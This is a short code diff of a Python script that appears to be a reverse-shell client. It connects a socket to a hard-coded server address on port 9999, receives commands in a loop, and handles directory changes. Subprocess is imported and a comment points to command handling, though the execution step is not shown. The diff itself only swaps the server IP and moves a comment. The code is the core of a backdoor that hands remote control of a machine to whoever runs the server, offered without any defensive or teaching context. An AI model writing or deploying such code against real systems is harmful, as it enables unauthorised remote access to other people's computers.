@@ -3,14 +3,15 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '192.168.8.103' # IP address of the server
+host = '192.168.0.24' # IP address of the server
 port = 9999 # Port to listen on (non-privileged ports are > 1023)
 
 s.connect((host, port))
 
 while True:
     data = s.recv(1024) # amount of data Receive data from server
-    if data[:2].decode("utf-8") == "cd": # if want to go back to the previous directory
+    #if want to go back to the previous directory
+    if data[:2].decode("utf-8") == "cd":
         os.chdir(data[3:].decode("utf-8")) # get rest to change directory
 
     #check for commands
